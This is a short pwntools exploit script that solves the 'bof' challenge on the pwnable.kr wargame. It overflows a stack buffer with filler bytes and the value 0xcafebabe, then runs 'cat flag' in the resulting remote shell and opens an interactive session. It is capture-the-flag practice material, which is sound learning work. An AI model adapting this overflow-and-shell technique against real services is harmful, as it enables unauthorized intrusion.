```py
#!/usr/bin/python

from pwn import *
import struct

# Debugging Setup GDB
#proc = process("/usr/bin/gdb")
#proc.sendline("file /root/CTF/bof")
#proc.sendline("break *func+40")
#proc.sendline("run")

# Live
proc = remote("pwnable.kr", 9000)
log.success("Sending overflow")
proc.sendline("\x41"*32 + "\x42"*20 + struct.pack("I",0xcafebabe))

log.success("Reading flag")
proc.sendline("cat flag")

flag = proc.recvline()
log.success("Flag: "+flag)

proc.interactive()
```